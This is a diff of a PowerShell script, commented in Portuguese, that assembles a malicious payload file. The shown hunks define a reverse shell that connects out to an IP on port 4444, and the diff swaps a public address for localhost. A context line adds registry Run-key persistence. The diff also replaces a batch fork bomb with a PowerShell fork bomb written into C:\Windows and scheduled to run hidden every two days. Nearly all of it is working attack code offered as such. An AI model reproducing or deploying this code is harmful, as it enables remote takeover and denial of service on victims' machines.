@@ -6,7 +6,7 @@
 
 # Define Payload de Shell-Reverso
 $x = @'
-$ip = '179.106.231.153';
+$ip = '127.0.0.1';
 $port = 4444;
 $TCPClient = New-Object Net.Sockets.TCPClient($ip, $port);
 $NetworkStream = $TCPClient.GetStream();
@@ -31,16 +31,15 @@ Write-Output 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v pers
 #                                                             #
 ###############################################################
 
-# Define Payload de Fork-Bomb
-$payloadBomb = '%0|%0';
+
+
+# Inicio Fork Bomb
+Write-Output '# Bomb' >> .\payload.txt
 
 # Cria o arquivo Fork-Bomb
-$payloadBomb | Out-File .\bomb.bat
-
-Write-Output '# Bomb' >> .\payload.txt
+Write-Output 'Write-Output "For(){ Sajb{ For(){ } } }" | Out-File C:\Windows\bomb.ps1' >> .\payload.txt
 # define o que vai ser rodado e seus parâmetros
-
-Write-Output '$actions = (New-ScheduledTaskAction -Execute "bomb.bat" -Argument Hidden)'  >> .\payload.txt
+Write-Output '$actions = (New-ScheduledTaskAction -Execute "C:\Windows\bomb.ps1" -Argument Hidden)'  >> .\payload.txt
 # define o gatilho que desencadeará a ação
 Write-Output '$trigger = New-ScheduledTaskTrigger -Daily -At "12:00 PM" -DaysInterval 2'  >> .\payload.txt
 # define o usuário e nível de privilégio
